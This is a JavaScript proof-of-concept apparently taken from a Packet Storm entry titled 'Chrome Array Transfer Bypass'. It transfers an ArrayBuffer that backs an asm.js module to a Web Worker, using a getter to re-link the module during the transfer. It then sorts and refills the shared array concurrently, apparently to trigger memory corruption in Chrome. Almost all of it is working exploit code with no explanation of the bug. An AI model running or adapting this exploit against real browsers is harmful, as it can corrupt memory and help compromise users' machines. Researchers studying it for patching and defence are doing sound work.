/*
Source: https://packetstormsecurity.com/files/162579/Chrome-Array-Transfer-Bypass.html
*/
function create_asmjs_module(stdlib, foreign, heap) {
		"use asm";
		var i32 = new stdlib.Int32Array(heap);

		function foo() { return 0; }

		return { foo: foo };
}

buffer = new ArrayBuffer(4 * 1024);
to_transfer = {
	buffer,
	get create_asm_js() {
		asmjs_module = create_asmjs_module(window, {}, buffer);
	}
};

worker = new Worker(URL.createObjectURL(new Blob([`
	onmessage = e => {
		let buffer = e.data.buffer;
		let array = new Float32Array(buffer);
		while (true)
			array.sort();
	}
`])));
worker.postMessage(to_transfer, [buffer]);

let array = new Float32Array(buffer);
setInterval(() => array.fill(Math.random()), 0);